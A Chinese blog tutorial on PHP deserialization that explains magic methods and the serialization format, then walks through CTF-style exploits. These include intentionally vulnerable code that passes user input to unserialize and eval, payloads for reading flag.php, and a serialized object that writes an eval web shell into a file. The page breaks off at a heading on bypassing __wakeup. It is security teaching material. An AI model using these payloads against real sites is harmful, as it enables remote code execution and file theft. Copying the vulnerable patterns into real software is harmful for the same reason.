



<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="Hexo" href="http://example.com/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="Hexo" href="http://example.com/atom.xml" />
<link rel="alternate" type="application/json" title="Hexo" href="http://example.com/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  

<link rel="canonical" href="http://example.com/2022/04/16/Unserialize/">



  <title>
反序列化 - web安全 |
Yume Shoka = Hexo</title>
<meta name="generator" content="Hexo 5.4.2"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">反序列化
  </h1>
  
<div class="meta">
  <span class="item" title="Created: 2022-04-16 13:38:45">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">Posted on</span>
    <time itemprop="dateCreated datePublished" datetime="2022-04-16T13:38:45+08:00">2022-04-16</time>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="Toggle navigation bar">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">Yume Shoka</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
        <ul>
          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclxp31goj20zk0m8qv5.jpg"></li>
          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipetfk5zwj20zk0m8e81.jpg"></li>
          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicit4jrvuj20zk0m8785.jpg"></li>
          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclhnx9glj20zk0m8npd.jpg"></li>
          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclip4jbpj20zk0m87cv.jpg"></li>
          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipetlbztpj20zk0m84qp.jpg"></li>
        </ul>
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="item" rel="index" title="In web安全"><span itemprop="name">web安全</span></a>
<meta itemprop="position" content="1" /></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
  <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/16/Unserialize/">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content="John Doe">
    <meta itemprop="description" content=", ">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="Hexo">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <h1 id="unserialize"><a class="markdownIt-Anchor" href="#unserialize">#</a> Unserialize</h1>
<h2 id="1php"><a class="markdownIt-Anchor" href="#1php">#</a> 1.php</h2>
<h3 id="类与对象"><a class="markdownIt-Anchor" href="#类与对象">#</a> 类与对象</h3>
<p>类是定义一系列属性和操作的模板，而对象，就是把属性进行实例化，完事交给类里面的方法，进行处理。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class people&#123;</span><br><span class="line">   //定义类属性（类似变量）,public 代表可见性（公有）</span><br><span class="line">    public $name = &#x27;joker&#x27;;</span><br><span class="line">   //定义类方法（类似函数）</span><br><span class="line">   public function smile()&#123;</span><br><span class="line">        echo $this-&gt;name.&quot; is smile...\n&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$psycho = new people(); //根据people类实例化对象</span><br><span class="line">$psycho-&gt;smile();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="魔法方法"><a class="markdownIt-Anchor" href="#魔法方法">#</a> 魔法方法</h3>
<table>
<thead>
<tr>
<th>方法名</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>__construct</td>
<td>构造函数，在创建对象时候初始化对象，一般用于对变量赋初值</td>
</tr>
<tr>
<td>__destruct</td>
<td>析构函数，和构造函数相反，在对象不再被使用时 (将所有该对象的引用设为 null) 或者程序退出时自动调用</td>
</tr>
<tr>
<td>__toString</td>
<td>当一个对象被当作一个字符串被调用，把类当作字符串使用时触发，返回值需要为字符串，例如 echo 打印出对象就会调用此方法</td>
</tr>
<tr>
<td>__wakeup()</td>
<td>使用 unserialize 时触发，反序列化恢复对象之前调用该方法</td>
</tr>
<tr>
<td>__sleep()</td>
<td>使用 serialize 时触发 ，在对象被序列化前自动调用，该函数需要返回以类成员变量名作为元素的数组 (该数组里的元素会影响类成员变量是否被序列化。只有出现在该数组元素里的类成员变量才会被序列化)</td>
</tr>
<tr>
<td>__destruct()</td>
<td>对象被销毁时触发</td>
</tr>
<tr>
<td>__call()</td>
<td>在对象中调用不可访问的方法时触发，即当调用对象中不存在的方法会自动调用该方法</td>
</tr>
<tr>
<td>__callStatic()</td>
<td>在静态上下文中调用不可访问的方法时触发</td>
</tr>
<tr>
<td>__get()</td>
<td>读取不可访问的属性的值时会被调用（不可访问包括私有属性，或者没有初始化的属性）</td>
</tr>
<tr>
<td>__set()</td>
<td>在给不可访问属性赋值时，即在调用私有属性的时候会自动执行</td>
</tr>
<tr>
<td>__isset()</td>
<td>当对不可访问属性调用 isset () 或 empty () 时触发</td>
</tr>
<tr>
<td>__unset()</td>
<td>当对不可访问属性调用 unset () 时触发</td>
</tr>
<tr>
<td>__invoke()</td>
<td>当脚本尝试将对象调用为函数时触发</td>
</tr>
</tbody>
</table>
<p>额外提一下__tostring 的具体触发场景：</p>
<blockquote>
<p>(1) echo(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>o</mi><mi>b</mi><mi>j</mi><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mi>p</mi><mi>r</mi><mi>i</mi><mi>n</mi><mi>t</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">obj) / print(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">o</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">)</span><span class="mord">/</span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mopen">(</span></span></span></span>obj) 打印时会触发</p>
<p>(2) 反序列化对象与字符串连接时</p>
<p>(3) 反序列化对象参与格式化字符串时</p>
<p>(4) 反序列化对象与字符串进行<mark>比较时（PHP 进行</mark>比较的时候会转换参数类型）</p>
<p>(5) 反序列化对象参与格式化 SQL 语句，绑定参数时</p>
<p>(6) 反序列化对象在经过 php 字符串函数，如 strlen ()、addslashes () 时</p>
<p>(7) 在 in_array () 方法中，第一个参数是反序列化对象，第二个参数的数组中有 toString 返回的字符串的时候 toString 会被调用</p>
<p>(8) 反序列化的对象作为 class_exists () 的参数的时候</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class animal &#123;</span><br><span class="line">        private $name = &#x27;caixukun&#x27;;</span><br><span class="line"></span><br><span class="line">        public function sleep()&#123;</span><br><span class="line">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class="line">            echo $this-&gt;name . &quot; is sleeping...\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        public function __wakeup()&#123;</span><br><span class="line">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class="line">            echo &quot;调用了__wakeup()方法\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class="line">            echo &quot;调用了__construct()方法\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        public function __destruct()&#123;</span><br><span class="line">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class="line">            echo &quot;调用了__destruct()方法\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        public function __toString()&#123;</span><br><span class="line">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class="line">            echo &quot;调用了__toString()方法\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        public function __set($key, $value)&#123;</span><br><span class="line">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class="line">            echo &quot;调用了__set()方法\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        public function __get($key) &#123;</span><br><span class="line">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class="line">            echo &quot;调用了__get()方法\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $ji = new animal();</span><br><span class="line">    $ji-&gt;name = 1;</span><br><span class="line">    echo $ji-&gt;name;</span><br><span class="line">    $ji-&gt;sleep();</span><br><span class="line">    $ser_ji = serialize($ji);</span><br><span class="line">    //print_r($ser_ji);</span><br><span class="line">    print_r(unserialize($ser_ji))</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//最后调用的结果是：</span><br><span class="line">调用了__construct()方法</span><br><span class="line">调用了__set()方法</span><br><span class="line">调用了__get()方法</span><br><span class="line">caixukun is sleeping...</span><br><span class="line">调用了__wakeup()方法 animal Object ( [name:animal:private] =&gt; caixukun )</span><br><span class="line">调用了__destruct()方法</span><br><span class="line">调用了__destruct()方法</span><br></pre></td></tr></table></figure>
<h3 id="序列化与反序列化"><a class="markdownIt-Anchor" href="#序列化与反序列化">#</a> 序列化与反序列化</h3>
<p>在开发的过程中常常遇到需要把对象或者数组进行序列号存储，反序列化输出的情况。特别是当需要把数组存储到 mysql 数据库中时，我们时常需要将数组进行序列号操作。</p>
<p>php 序列化（serialize）：是将变量转换为可保存或传输的字符串的过程</p>
<p>php 反序列化（unserialize）：就是在适当的时候把这个字符串再转化成原来的变量使用</p>
<h4 id="序列化"><a class="markdownIt-Anchor" href="#序列化">#</a> 序列化</h4>
<p><strong>需要注意的是变量受到不同修饰符（public，private，protected）修饰进行序列化时，序列化后变量的长度和名称会发生变化</strong>。</p>
<ul>
<li>使用 public 修饰进行序列化后，变量 $team 的长度为 4，正常输出。</li>
<li>使用 private 修饰进行序列化后，会在变量 $team_name 前面加上类的名称，在这里是 object，并且长度会比正常大小多 2 个字节，也就是 9+6+2=17。</li>
<li>使用 protected 修饰进行序列化后，会在变量 $team_group 前面加上 *，并且长度会比正常大小多 3 个字节，也就是 10+3=13。</li>
</ul>
<p>通过对比发现，在受保护的成员前都多了两个字节，受保护的成员在序列化时规则：</p>
<blockquote>
<ol>
<li>
<p>受 Private 修饰的私有成员，序列化时: \x00 + [私有成员所在类名] + \x00 [变量名]</p>
</li>
<li>
<p>受 Protected 修饰的成员，序列化时：\x00 + * + \x00 + [变量名]</p>
</li>
</ol>
<p>其中，&quot;\x00&quot; 代表 ASCII 为 0 的值，即空字节，&quot;*&quot; 必不可少。</p>
</blockquote>
<p>验证一下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class object&#123;</span><br><span class="line">    public $team = &#x27;joker&#x27;;</span><br><span class="line">    private $team_name = &#x27;hahaha&#x27;;</span><br><span class="line">    protected $team_group = &#x27;biubiu&#x27;;</span><br><span class="line"></span><br><span class="line">    function hahaha()&#123;</span><br><span class="line">        $this-&gt;$team_members = &#x27;奥力给&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$object = new object();</span><br><span class="line">echo serialize($object);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">O:6:&quot;object&quot;:3:&#123;s:4:&quot;team&quot;;s:5:&quot;joker&quot;;s:17:&quot;objectteam_name&quot;;s:6:&quot;hahaha&quot;;s:13:&quot;*team_group&quot;;s:6:&quot;biubiu&quot;;&#125;</span><br><span class="line"></span><br><span class="line">如果我们使用urlencode输出时</span><br><span class="line">O%3A6%3A%22object%22%3A3%3A%7Bs%3A4%3A%22team%22%3Bs%3A5%3A%22joker%22%3Bs%3A17%3A%22%00object%00team_name%22%3Bs%3A6%3A%22hahaha%22%3Bs%3A13%3A%22%00%2A%00team_group%22%3Bs%3A6%3A%22biubiu%22%3B%7D</span><br><span class="line"></span><br><span class="line">就能很明显的看到%00和*了</span><br><span class="line"></span><br><span class="line">以上是序列化之后的结果，o代表是一个对象，6是对象object的长度，3的意思是有三个类属性，后面花括号里的是类属性的内容，s表示的是类属性team的类型，4表示类属性team的长度，后面的以此类推。值得一提的是，类方法并不会参与到实例化里面。</span><br></pre></td></tr></table></figure>
<h4 id="反序列化"><a class="markdownIt-Anchor" href="#反序列化">#</a> 反序列化</h4>
<p>反序列化的话，就依次根据规则进行反向复原。</p>
<p>这边定义一个字符串，然后使用反序列化函数 unserialize 进行反序列化处理，最后使用 var_dump 进行输出：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $ser = &#x27;O:6:&quot;object&quot;:3:&#123;s:1:&quot;a&quot;;i:1;s:4:&quot;team&quot;;s:6:&quot;hahaha&quot;;&#125;&#x27;;</span><br><span class="line">    $ser = unserialize($ser);</span><br><span class="line">    echo &#x27;&lt;pre&gt;&#x27;;</span><br><span class="line">    var_dump($ser);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">object(__PHP_Incomplete_Class)#1 (3) &#123;</span><br><span class="line">  [&quot;__PHP_Incomplete_Class_Name&quot;]=&gt;</span><br><span class="line">  string(6) &quot;object&quot;</span><br><span class="line">  [&quot;a&quot;]=&gt;</span><br><span class="line">  int(1)</span><br><span class="line">  [&quot;team&quot;]=&gt;</span><br><span class="line">  string(6) &quot;hahaha&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="利用"><a class="markdownIt-Anchor" href="#利用">#</a> 利用：</h3>
<p>在反序列化过程中，其功能就类似于创建了一个新的对象（复原一个对象可能更恰当），并赋予其相应的属性值。如果让攻击者操纵任意反序列数据， 那么攻击者就可以实现任意类对象的创建，如果一些类存在一些自动触发的方法（魔术方法），那么就有可能以此为跳板进而攻击系统应用。</p>
<p>挖掘反序列化漏洞的条件是：</p>
<blockquote>
<p>1. 代码中有可利用的类，并且类中有__wakeup ()，__sleep ()，__destruct () 这类特殊条件下可以自己调用的魔术方法。</p>
<p>2. unserialize () 函数的参数可控。</p>
</blockquote>
<h4 id="0x00-__destruct利用"><a class="markdownIt-Anchor" href="#0x00-__destruct利用">#</a> 0x00 __destruct () 利用</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    var $test = &quot;demo&quot;;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        @eval($this-&gt;test);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = $_POST[&#x27;test&#x27;];</span><br><span class="line">$len = strlen($test)+1;</span><br><span class="line">$p = &quot;O:1:\&quot;A\&quot;:1:&#123;s:4:\&quot;test\&quot;;s:&quot;.$len.&quot;:\&quot;&quot;.$test.&quot;;\&quot;;&#125;&quot;; // 构造序列化对象</span><br><span class="line">$test_unser = unserialize($p); // 反序列化同时触发_destruct函数</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">//利用同名变量覆盖和还原对象 可以理解为$test = $_POST[&#x27;test&#x27;],复原时还需要有对应的变量值的length</span><br><span class="line">//由于destruct会在对象销毁时自动调用，我们只需要传入对应的恶意外码即可，题目已经帮我们构造好了序列化后的代码</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">post:</span><br><span class="line">test=phpinfo();</span><br></pre></td></tr></table></figure>
<blockquote>
<p>如上代码，最终的目的是通过调用__destruct () 这个析构函数，将恶意的 payload 注入，导致代码执行。根据上面的魔术方法的介绍，当程序跑到 unserialize () 反序列化的时候，会触发__destruct () 方法，同时也可以触发__wakeup () 方法。但是如果想注入恶意 payload，还需要对<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>e</mi><mi>s</mi><mi>t</mi><mtext>的值进行覆盖，题目中已经给出了序列化链，很明显是对类</mtext><mi>A</mi><mtext>的</mtext></mrow><annotation encoding="application/x-tex">test的值进行覆盖，题目中已经给出了序列化链，很明显是对类A的</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">行</span><span class="mord cjk_fallback">覆</span><span class="mord cjk_fallback">盖</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">题</span><span class="mord cjk_fallback">目</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">已</span><span class="mord cjk_fallback">经</span><span class="mord cjk_fallback">给</span><span class="mord cjk_fallback">出</span><span class="mord cjk_fallback">了</span><span class="mord cjk_fallback">序</span><span class="mord cjk_fallback">列</span><span class="mord cjk_fallback">化</span><span class="mord cjk_fallback">链</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">很</span><span class="mord cjk_fallback">明</span><span class="mord cjk_fallback">显</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">类</span><span class="mord mathnormal">A</span><span class="mord cjk_fallback">的</span></span></span></span> test 变量进行覆盖。</p>
</blockquote>
<h4 id="0x01-__tostring利用"><a class="markdownIt-Anchor" href="#0x01-__tostring利用">#</a> 0x01 __tostring () 利用</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">//index.php</span><br><span class="line">&lt;?php </span><br><span class="line">$txt = $_GET[&quot;txt&quot;]; </span><br><span class="line">$file = $_GET[&quot;file&quot;]; </span><br><span class="line">$password = $_GET[&quot;password&quot;]; </span><br><span class="line">if(isset($txt)&amp;&amp;(file_get_contents($txt,&#x27;r&#x27;)===&quot;welcome to the bugkuctf&quot;))</span><br><span class="line">&#123; </span><br><span class="line">    echo &quot;hello friend!&lt;br&gt;&quot;; </span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))</span><br><span class="line">    &#123; </span><br><span class="line">       echo &quot;不能现在就给你flag哦&quot;; </span><br><span class="line">       exit(); </span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123; </span><br><span class="line">       include($file); </span><br><span class="line">       $password = unserialize($password); </span><br><span class="line">       echo $password; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123; </span><br><span class="line">       echo &quot;you are not the number of bugku ! &quot;; </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">//hint.php</span><br><span class="line">&lt;?php  </span><br><span class="line">class Flag&#123;//flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            return (&quot;good&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>hint.php 文件中使用了魔术方法__tostring () 方法，当一个对象被当作一个字符串被调用时即可触发，方法的主要作用是读取并打印传进来的 $file，估计是通过反序列化漏洞来读取 flag.php 的内容。追踪以下调用链，在 index.php 文件中发现使用 echo 将反序列化的对象当作字符串打印，此处就会触发__tostring () 方法，并且 unserialize () 内的变量可控，满足反序列化漏洞条件。</p>
</blockquote>
<h4 id="0x02-__wakeup利用"><a class="markdownIt-Anchor" href="#0x02-__wakeup利用">#</a> 0x02 __wakeup () 利用</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">    var $test = &#x27;123&#x27;;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $fp = fopen(&quot;flag.php&quot;,&quot;w&quot;);</span><br><span class="line">        fwrite($fp,$this-&gt;test);</span><br><span class="line">        fclose($fp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[&#x27;id&#x27;];</span><br><span class="line">print_r($a);</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">$a_unser = unserialize($a);</span><br><span class="line">require &quot;flag.php&quot;;</span><br><span class="line">?&gt;     </span><br><span class="line"></span><br><span class="line">pyload:</span><br><span class="line">?id=O:4:&quot;test&quot;:1:&#123;s:4:&quot;test&quot;;s:27:&quot;&lt;?php eval($_GET[&#x27;sb&#x27;]); ?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">    var $test = &quot;&lt;?php eval($_GET[&#x27;sb&#x27;]); ?&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$test = new test();</span><br><span class="line">echo serialize($test);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>通过调用魔术方法__wakeup 将 $test 的值写入 flag.php 文件中，当调用 unserialize () 反序列化操作时会触发__wakeup 魔术方法，接下来就需要构造传进去的 payload</p>
<p>在执行 unserialize () 方法时会触发__wakeup () 方法执行，将传入的字符串反序列化后，会替换掉 test 类里面 $test 变量的值，将 php 探针写入 flag.php 文件中，并通过下面的 require 引用，导致命令执行。</p>
</blockquote>
<h4 id="0x03-__wakeup绕过"><a class="markdownIt-Anchor" href="#0x03-__wakeup绕过">#</a> 0x03 __wakeup () 绕过</h4>
<p>极客大挑战 2019 PHP</p>
